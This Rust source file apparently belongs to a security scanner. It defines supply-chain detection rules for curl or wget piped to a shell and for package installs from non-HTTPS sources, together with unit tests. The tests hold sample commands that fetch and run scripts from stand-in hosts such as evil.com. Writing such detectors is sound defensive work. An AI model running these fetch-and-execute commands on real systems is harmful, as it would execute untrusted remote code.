use crate::rules::types::{Category, Confidence, Rule, Severity};
use regex::Regex;

pub fn rules() -> Vec<Rule> {
    vec![sc_001(), sc_002(), sc_003()]
}

fn sc_001() -> Rule {
    Rule {
        id: "SC-001",
        name: "Remote script execution via curl",
        description: "Detects curl piped to shell, a common supply chain attack vector",
        severity: Severity::Critical,
        category: Category::SupplyChain,
        confidence: Confidence::Certain,
        patterns: vec![
            // curl | bash/sh/zsh (basic)
            Regex::new(r"curl\s+[^|]*\|\s*(bash|sh|zsh|dash)").unwrap(),
            // curl | sudo bash/sh
            Regex::new(r"curl\s+[^|]*\|\s*sudo\s+.*\b(bash|sh|zsh)").unwrap(),
            // curl -s | bash
            Regex::new(r"curl\s+-[a-zA-Z]*s[a-zA-Z]*\s+[^|]*\|\s*(bash|sh|zsh)").unwrap(),
            // curl -sSL | bash (common installer pattern)
            Regex::new(r"curl\s+-[a-zA-Z]*[sS]+[a-zA-Z]*L?[a-zA-Z]*\s+[^|]*\|\s*(bash|sh|zsh)")
                .unwrap(),
            // curl | python (also dangerous)
            Regex::new(r"curl\s+[^|]*\|\s*python").unwrap(),
            // bash -c "$(curl ...)"
            Regex::new(r#"(bash|sh|zsh)\s+-c\s+["']?\$\(curl"#).unwrap(),
            // source <(curl ...)
            Regex::new(r"source\s+<\(curl").unwrap(),
            // . <(curl ...)
            Regex::new(r"\.\s+<\(curl").unwrap(),
        ],
        exclusions: vec![
            // localhost is generally safe
            Regex::new(r"localhost|127\.0\.0\.1|::1").unwrap(),
        ],
        message: "Remote script execution via curl detected. This is a common supply chain attack vector where malicious code can be injected.",
        recommendation: "Download the script first, review it, then execute. Use checksums to verify integrity.",
        fix_hint: Some(
            "curl -o install.sh URL && cat install.sh && sha256sum install.sh && bash install.sh",
        ),
        cwe_ids: &["CWE-829", "CWE-494"],
    }
}

fn sc_002() -> Rule {
    Rule {
        id: "SC-002",
        name: "Remote script execution via wget",
        description: "Detects wget piped to shell, a common supply chain attack vector",
        severity: Severity::Critical,
        category: Category::SupplyChain,
        confidence: Confidence::Certain,
        patterns: vec![
            // wget -O- | bash/sh
            Regex::new(r"wget\s+[^|]*-O\s*-[^|]*\|\s*(bash|sh|zsh)").unwrap(),
            // wget -qO- | bash
            Regex::new(r"wget\s+[^|]*-[a-zA-Z]*q[a-zA-Z]*O\s*-[^|]*\|\s*(bash|sh|zsh)").unwrap(),
            // wget --quiet -O - | bash
            Regex::new(r"wget\s+[^|]*--quiet[^|]*-O\s+-[^|]*\|\s*(bash|sh|zsh)").unwrap(),
            // wget | sudo bash/sh
            Regex::new(r"wget\s+[^|]*\|\s*sudo\s+.*\b(bash|sh|zsh)").unwrap(),
            // bash -c "$(wget ...)"
            Regex::new(r#"(bash|sh|zsh)\s+-c\s+["']?\$\(wget"#).unwrap(),
        ],
        exclusions: vec![Regex::new(r"localhost|127\.0\.0\.1|::1").unwrap()],
        message: "Remote script execution via wget detected. This is a common supply chain attack vector.",
        recommendation: "Download the script first, review it, then execute. Use checksums to verify integrity.",
        fix_hint: Some(
            "wget -O install.sh URL && cat install.sh && sha256sum install.sh && bash install.sh",
        ),
        cwe_ids: &["CWE-829", "CWE-494"],
    }
}

fn sc_003() -> Rule {
    Rule {
        id: "SC-003",
        name: "Untrusted package source",
        description: "Detects package installation from non-standard sources that may contain malicious code",
        severity: Severity::High,
        category: Category::SupplyChain,
        confidence: Confidence::Firm,
        patterns: vec![
            // pip install from HTTP (not HTTPS)
            Regex::new(r"pip3?\s+install\s+.*--index-url\s+http://").unwrap(),
            Regex::new(r"pip3?\s+install\s+.*-i\s+http://").unwrap(),
            // pip install from git over HTTP
            Regex::new(r"pip3?\s+install\s+git\+http://").unwrap(),
            // npm install from HTTP registry
            Regex::new(r"npm\s+.*--registry\s+http://").unwrap(),
            // npm install from git URL (insecure protocol)
            Regex::new(r"npm\s+install\s+git://").unwrap(),
            Regex::new(r"npm\s+install\s+git\+http://").unwrap(),
            // yarn with HTTP registry
            Regex::new(r"yarn\s+.*--registry\s+http://").unwrap(),
            // gem install from HTTP source
            Regex::new(r"gem\s+install\s+.*--source\s+http://").unwrap(),
            // cargo install from git with HTTP
            Regex::new(r"cargo\s+install\s+--git\s+http://").unwrap(),
            // pip install with --trusted-host (often used to bypass HTTPS)
            Regex::new(r"pip3?\s+install\s+.*--trusted-host").unwrap(),
        ],
        exclusions: vec![
            // localhost/internal registries are often legitimate
            Regex::new(r"localhost|127\.0\.0\.1|::1").unwrap(),
            // Private registries with common naming
            Regex::new(r"registry\.(internal|corp|local)").unwrap(),
        ],
        message: "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
        recommendation: "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning.",
        fix_hint: Some("Use HTTPS: pip install --index-url https://pypi.org/simple/ package"),
        cwe_ids: &["CWE-829", "CWE-494", "CWE-319"],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sc_001_detects_curl_pipe_bash() {
        let rule = sc_001();
        let test_cases = vec![
            // Should detect
            ("curl https://evil.com/install.sh | bash", true),
            ("curl -s https://evil.com/script.sh | sh", true),
            ("curl -sSL https://get.evil.com | bash", true),
            (
                "curl -fsSL https://raw.githubusercontent.com/user/repo/main/install.sh | bash",
                true,
            ),
            (
                r#"bash -c "$(curl -fsSL https://evil.com/install.sh)""#,
                true,
            ),
            ("source <(curl -s https://evil.com/env.sh)", true),
            ("curl https://example.com/script.sh | python", true),
            // Should not detect
            ("curl https://api.github.com/repos", false),
            ("curl -o file.sh https://example.com/script.sh", false),
            ("curl http://localhost:3000/script.sh | bash", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_sc_002_detects_wget_pipe_bash() {
        let rule = sc_002();
        let test_cases = vec![
            // Should detect
            ("wget -O- https://evil.com/install.sh | bash", true),
            ("wget -qO- https://evil.com/script.sh | sh", true),
            ("wget --quiet -O - https://evil.com/install.sh | bash", true),
            (
                r#"bash -c "$(wget -qO- https://evil.com/install.sh)""#,
                true,
            ),
            // Should not detect
            ("wget https://example.com/file.tar.gz", false),
            ("wget -O script.sh https://example.com/script.sh", false),
            ("wget -O- http://localhost:8080/script.sh | bash", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_sc_003_detects_untrusted_package_sources() {
        let rule = sc_003();
        let test_cases = vec![
            // Should detect (HTTP sources)
            (
                "pip install --index-url http://evil.com/simple package",
                true,
            ),
            ("pip install -i http://malicious-pypi.com/ package", true),
            ("pip install git+http://github.com/user/repo.git", true),
            ("npm install --registry http://evil.com package", true),
            ("npm install git://github.com/user/malicious-repo.git", true),
            ("gem install --source http://evil.com package", true),
            ("cargo install --git http://github.com/user/repo", true),
            ("pip install --trusted-host evil.com package", true),
            // Should not detect (safe patterns)
            ("pip install requests", false),
            (
                "pip install --index-url https://pypi.org/simple/ package",
                false,
            ),
            ("npm install express", false),
            (
                "npm install --registry https://registry.npmjs.org package",
                false,
            ),
            ("pip install -i http://localhost:8080/simple package", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_sc_001_common_installer_patterns() {
        let rule = sc_001();
        // Common installer patterns that should be detected
        let installers = vec![
            "curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -",
            "curl -sSL https://install.python-poetry.org | python3 -",
            "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
        ];

        for installer in installers {
            let matched = rule.patterns.iter().any(|p| p.is_match(installer));
            assert!(matched, "Should detect installer pattern: {}", installer);
        }
    }

    #[test]
    fn test_sc_003_allows_https_sources() {
        let rule = sc_003();
        // HTTPS sources should NOT trigger
        let safe_commands = vec![
            "pip install --index-url https://pypi.org/simple/ package",
            "pip install -i https://custom-pypi.company.com/simple/ package",
            "npm install --registry https://registry.npmjs.org package",
            "npm install --registry https://npm.pkg.github.com package",
            "gem install --source https://rubygems.org package",
            "cargo install --git https://github.com/user/repo",
        ];

        for cmd in safe_commands {
            let matched = rule.patterns.iter().any(|p| p.is_match(cmd));
            assert!(!matched, "Should NOT detect HTTPS source: {}", cmd);
        }
    }
}
